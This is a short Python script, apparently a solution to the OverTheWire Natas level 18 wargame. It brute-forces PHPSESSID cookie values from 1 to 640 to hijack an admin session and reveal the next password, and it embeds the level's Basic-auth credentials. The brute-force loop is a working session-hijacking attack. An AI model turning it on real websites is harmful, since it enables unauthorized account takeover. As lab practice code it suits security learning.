import requests

# input in text file?
# as a string?
# ver 1 - just a request explainer? parsing the request and explaining it

# most common
#           "User-Agent": default_user_agent(),
#           "Accept-Encoding: gzip, deflate",
#           "Accept": "*/*",
#           "Connection": "keep-alive",


example_request_from_burp = """
GET /index.php?debug&username=admin&password=password HTTP/1.1
Host: natas18.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Origin: http://natas18.natas.labs.overthewire.org
Authorization: Basic bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg==
Connection: keep-alive
Referer: http://natas18.natas.labs.overthewire.org/
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1
Cookie: PHPSESSID=218

"""
# print(example_request_from_burp)

url = "http://natas18.natas.labs.overthewire.org/index.php?debug"
auth = ("natas18", "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ")
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Origin": "http://natas18.natas.labs.overthewire.org",
    "Authorization": "Basic bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg==",
    "Connection": "keep-alive",
    "Referer": "http://natas18.natas.labs.overthewire.org/",
    "Upgrade-Insecure-Requests": "1",
    "DNT": "1",
    "Sec-GPC": "1"
}

session = requests.Session()

for id in range(1, 641):

    cookies = dict(PHPSESSID=str(id))

    # try:
    response = session.get(url, headers=headers, cookies=cookies)  # auth=auth)
    # except (requests.exceptions.Timeout, requests.exceptions.TooManyRedirects, requests.exceptions.RequestException, requests.exceptions.ConnectionError, requests.exceptions.HTTPError) as e:
    #    print("No internet connection")
    #    exit()

    if response.status_code == 200:
        # print(response.headers)
        # print(response.text)
        if "Password:" in response.text:
            print(response.text)
            exit()
